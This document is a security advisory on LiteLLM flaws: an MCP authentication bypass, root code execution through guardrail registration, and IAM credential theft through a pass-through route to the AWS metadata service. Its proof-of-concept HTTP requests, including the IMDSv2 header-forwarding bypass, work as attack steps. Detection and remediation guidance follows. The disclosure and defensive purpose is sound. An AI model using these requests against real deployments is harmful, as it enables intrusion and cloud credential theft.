# LiteLLM MCP Auth Bypass & RCE — CVE-2026-59822 / CVE-2026-59821 (CISA KEV, Actively Exploited)

**Date:** September 2026 (disclosed); exploitation in wild from July 2026
**Ecosystem:** AI Infrastructure / LiteLLM / MCP / Cloud (AWS, GCP, Azure)
**Severity:** Critical
**CVEs:** CVE-2026-59822 (MCP auth bypass, CISA KEV), CVE-2026-59821 (RCE via guardrails), CVE-2026-35029 (pass-through endpoint, fixed separately)
**Type:** MCP Authentication Bypass / RCE in AI Infrastructure / Cloud Credential Theft
**Sources:**
- [Wiz Research — Off Guard: Breaking LiteLLM from Authentication Bypass to Cloud Compromise](https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise)

---

## Summary

Wiz Research disclosed three chained vulnerabilities in LiteLLM, the open-source AI gateway used in approximately one-third of cloud environments. LiteLLM routes developer and production LLM traffic across over 100 providers (OpenAI, Anthropic, AWS Bedrock, Azure, Vertex AI), holding every configured provider API key and processing every prompt. A compromised LiteLLM instance is therefore a high-value pivot point into both AI provider accounts and the surrounding cloud infrastructure.

The most critical vulnerability, CVE-2026-59822, is an MCP authentication bypass that allows any caller — with any arbitrary Bearer token value (even a single character) — to establish a fully authenticated MCP session. Because LiteLLM's MCP endpoint uses a separate authentication handler that silently swallows 401 errors from invalid keys, the bypass requires exactly one HTTP request. CVE-2026-59822 was added to CISA's Known Exploited Vulnerabilities catalog on September 2, 2026, and Wiz confirmed active exploitation via honeypot telemetry starting July 7, 2026.

The second vulnerability, CVE-2026-59821, allows a post-auth admin to achieve root-level RCE on the LiteLLM host via the custom code guardrails endpoint, which passed submitted Python directly to `exec(compile(...))` without the sandbox or forbidden-pattern checks applied by the UI test path. Critically, the pre-patch default LiteLLM configuration granted every unauthenticated request `PROXY_ADMIN` access when no master key was configured — and a Wiz scan of roughly 3,000 public instances in February 2026 found that 9.6% accepted the default master key (`sk-1234`) or required no authentication at all. In those cases, RCE was effectively pre-auth.

A third vector — cloud credential theft via the pass-through endpoint — allowed any admin to create a proxy route pointed at the AWS EC2 Instance Metadata Service (IMDS), bypassing even IMDSv2 protections via LiteLLM's header-forwarding mechanism, to exfiltrate IAM session credentials.

---

## Compromised Artifacts

| Component | Vulnerability | Affected Versions | Fix Version |
|-----------|--------------|-------------------|-------------|
| LiteLLM — MCP authentication handler (`user_api_key_auth_mcp.py`) | CVE-2026-59822 — MCP auth bypass (CISA KEV) | All versions before v1.84.0 | v1.84.0 (Apr 25, 2026) |
| LiteLLM — Custom Code Guardrails (`guardrail_endpoints.py`) | CVE-2026-59821 — Root-level RCE | All versions before v1.82.0 | v1.82.0 (Feb 25, 2026) |
| LiteLLM — Pass-through endpoint config (`pass_through_endpoints.py`) | CVE-2026-35029 — SSRF / IMDS credential theft | All versions before v1.83.0 | v1.83.0 |

---

## How It Worked

### Entry Point 1 — MCP Authentication Bypass (CVE-2026-59822)

LiteLLM's MCP endpoint (`/mcp/`) uses a separate authentication handler designed to support dual authentication: LiteLLM API keys for direct users, and OAuth2 token passthrough for users authenticating via upstream providers. When a Bearer token fails LiteLLM key validation with a 401, the handler catches the exception and returns an empty `UserAPIKeyAuth()` object — granting access as if authenticated:

```python
elif oauth2_headers:
    try:
        validated_user_api_key_auth = await user_api_key_auth(
            api_key=litellm_api_key, request=request
        )
    except HTTPException as e:
        if e.status_code in (401, 403):
            validated_user_api_key_auth = UserAPIKeyAuth()  # bypass
        else:
            raise
```

Any request with an `Authorization: Bearer <anything>` header triggers the bypass. A single request suffices:

```http
POST /mcp/ HTTP/1.1
Host: <target>:4000
Authorization: Bearer a
Content-Type: application/json

{"jsonrpc":"2.0","method":"initialize","id":1,"params":{"protocolVersion":"2025-03-26",
"capabilities":{},"clientInfo":{"name":"attacker","version":"1.0"}}}
```

The server returns HTTP 200 with a valid `mcp-session-id` header. From there the attacker has full MCP protocol access — including executing tools connected to Jira, Slack, internal databases, and CI/CD pipelines if they are configured with `allow_all_keys`.

### Entry Point 2 — Root RCE via Custom Code Guardrails (CVE-2026-59821)

LiteLLM's custom code guardrails feature lets admins submit Python code that runs before every LLM inference call. The registration endpoint (`POST /guardrails`) called `exec(compile(self.custom_code, "<guardrail>", "exec"), exec_globals)` without applying the forbidden-patterns check or stripping `__builtins__` — both protections that were only applied in the UI test endpoint. Python automatically populates `__builtins__` when absent from the execution globals, granting full standard library access:

```http
POST /guardrails HTTP/1.1
Authorization: Bearer <master_key>

{"guardrail":{"guardrail_name":"poc","litellm_params":{"guardrail":"custom_code",
"mode":"pre_call","default_on":true,"custom_code":"import os\n_cmd = os.popen('id').read()\ndef apply_guardrail(inputs, request_data, input_type):\n return {\"action\": \"block\", \"reason\": _cmd}"}}}
```

The code executed immediately on registration (not at inference time), returning output via the guardrail block reason on the next LLM request: `uid=0(root) gid=0(root)`.

Pre-patch, when no master key was configured, every request was assigned `PROXY_ADMIN` role, making this effectively pre-auth RCE on misconfigured or default deployments.

### Entry Point 3 — Cloud Credential Theft via Pass-Through Endpoint

LiteLLM's pass-through endpoint feature lets admins proxy requests to arbitrary URLs with no validation against private ranges or cloud metadata endpoints. An admin could create a route to the AWS IMDS:

```http
POST /config/pass_through_endpoint HTTP/1.1
Authorization: Bearer <master_key>

{"path": "/meta", "target": "http://169.254.169.254/latest/", "headers": {}, "include_subpath": true}
```

Then retrieve IAM credentials:

```http
GET /meta/meta-data/iam/security-credentials/<role_name> HTTP/1.1
Authorization: Bearer <master_key>
```

Response: `{"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..."}`.

IMDSv2 protections were also defeated: LiteLLM's header-forwarding mechanism strips the `x-pass-` prefix from any forwarded header, so `x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600` arrived at the IMDS as the required token header.

### Attacker-Favourable Deployment Reality

Wiz scanned ~3,000 publicly exposed LiteLLM instances in February 2026:
- 9.6% accepted the default master key (`sk-1234`) or required no authentication at all
- Of those, 6.2% (191 instances) had no authentication whatsoever
- A follow-up scan in August 2026 found over 85,000 instances (majority honeypots/test deployments)
- LiteLLM documentation used `sk-1234` as the example key in all quickstart guides, Docker Compose examples, and tutorials

---

## Timeline

| Date (UTC) | Event |
|------------|-------|
| Feb 18, 2026 | RCE vulnerability (CVE-2026-59821) discovered by Wiz Research and reported to LiteLLM maintainers |
| Feb 25, 2026 | Fix released: v1.82.0 — RCE sandbox escape patched; guardrail endpoints now require PROXY_ADMIN |
| Apr 25, 2026 | Fix released: v1.84.0 — MCP authentication bypass (CVE-2026-59822) patched |
| Apr 25, 2026 | v1.83.0 released separately — CVE-2026-35029 pass-through endpoint now requires PROXY_ADMIN |
| Jul 7, 2026 | CVE-2026-59822 (MCP auth bypass) exploitation first observed in Wiz honeypot infrastructure |
| Jul 8, 2026 | CVE-2026-59821 and CVE-2026-59822 published publicly |
| Sep 2, 2026 | CVE-2026-59822 added to CISA Known Exploited Vulnerabilities (KEV) catalog |
| Sep 9, 2026 | Full Wiz Research blog post published; presented at DEF CON 34 |

---

## Detection

```bash
# --- Check LiteLLM version ---
pip show litellm 2>/dev/null | grep -E '^Version|^Name'
# Vulnerable to CVE-2026-59822: < 1.84.0
# Vulnerable to CVE-2026-59821: < 1.82.0

# --- Test for MCP auth bypass on an instance ---
# (Run from a network-connected host; replace <host> and <port>)
curl -s -o /dev/null -w "%{http_code}" \
  -X POST "http://<host>:<port>/mcp/" \
  -H "Authorization: Bearer garbage_token_test" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"initialize","id":1,"params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"test","version":"1.0"}}}' 
# 200 = vulnerable, 401 = patched

# --- Check if default master key is in use ---
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer sk-1234" \
  "http://<host>:<port>/health"
# 200 = default key still active; rotate immediately

# --- List configured guardrails (post-auth) ---
curl -s -H "Authorization: Bearer <master_key>" \
  "http://<host>:<port>/guardrails" | python3 -m json.tool

# --- Check for unexpected pass-through endpoints ---
curl -s -H "Authorization: Bearer <master_key>" \
  "http://<host>:<port>/config/list?config_type=pass_through_endpoint" | python3 -m json.tool

# --- Check container logs for unexpected process spawning ---
# Look for Python exec or subprocess calls in LiteLLM container logs
docker logs litellm 2>&1 | grep -iE 'exec|subprocess|os\.popen|guardrail'

# --- Scan for public LiteLLM instances in your IP space ---
# (Shodan query: product:"LiteLLM" port:4000)
# Check your cloud provider's internet-exposed service inventory

# --- Verify IAM credentials were not stolen via IMDS ---
# Check AWS CloudTrail for unusual GetCallerIdentity or AssumeRole from unexpected IPs
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetCallerIdentity \
  --start-time 2026-07-01T00:00:00Z \
  2>/dev/null | jq '.Events[] | {time: .EventTime, user: .Username, ip: (.CloudTrailEvent | fromjson | .sourceIPAddress)}'
```

---

## Remediation

1. **Upgrade LiteLLM to v1.84.0 or later** — this patches both CVE-2026-59821 and CVE-2026-59822. All three CVEs are fixed in this release.
2. **Change the master key** — if `sk-1234` or any other default is in use, rotate it immediately. Generate a cryptographically random secret (e.g., `openssl rand -hex 32`).
3. **Audit guardrails** — review all registered guardrails (`GET /guardrails`) for unexpected entries and restart the LiteLLM process to clear any in-memory guardrail code.
4. **Audit pass-through endpoints** — remove any pass-through routes pointing to IMDS, localhost, or internal metadata services.
5. **Apply least-privilege IAM** — use IRSA (EKS), Workload Identity (GKE), or Managed Identity (AKS) rather than long-lived credentials. Scope the service account to only the LLM provider permissions required.
6. **Restrict network exposure** — LiteLLM should not be internet-accessible. Place it behind a VPC-internal load balancer or API gateway; enforce IMDSv2 with hop-limit=1 on EC2 instances.
7. **If exploitation is suspected** — rotate all LLM provider API keys configured in LiteLLM, rotate IAM credentials for the hosting workload, review provider usage logs for unexpected API calls, and check audit logs for unusual pass-through endpoint creation.

---

## Lessons Learned

- **AI gateways are Tier-1 infrastructure**: LiteLLM holds credentials for every LLM provider, executes server-side code on every inference request, and connects to internal tools via MCP. Treating it as a developer convenience tool rather than a privileged credential store creates systemic risk.
- **Separate code paths for the same feature must be equally hardened**: The RCE vulnerability (CVE-2026-59821) existed because the registration endpoint omitted sandbox enforcement present in the test endpoint. When a feature has multiple entry points, all must apply the same security controls.
- **"No auth" should never mean "admin access"**: LiteLLM's default of granting `PROXY_ADMIN` to unauthenticated requests compounded the RCE from post-auth to pre-auth for a significant fraction of deployments.
- **Default credentials in documentation create real-world risk**: Using `sk-1234` as the example key in quickstart guides resulted in nearly 1 in 10 public instances running with an unchanged default — the most predictable credential an attacker could target.
- **MCP expands the blast radius of auth failures**: Once inside MCP, an attacker can interact with every connected tool (Jira, Slack, CI/CD, databases) without further authentication. MCP authentication bypasses therefore need the same urgency as direct API key theft.

---

## Related Incidents

- [CVE-2026-12957 — Amazon Q VS Code Extension MCP Auto-Execution (Jun 2026)](./2026-06-amazon-q-mcp-auto-execution.md)
- [litellm PyPI Credential Stealer — TeamPCP (Mar 2026)](./2026-03-litellm-pypi-stealer.md)
- [Pickle in the Middle — Vertex AI SDK Bucket Squatting (Jun 2026)](./2026-06-pickle-in-the-middle-vertex-ai.md)
- [GhostApproval — AI Coding Assistant Trust Boundary Flaw (Jul 2026)](./2026-07-ghostapproval-ai-coding-assistants.md)
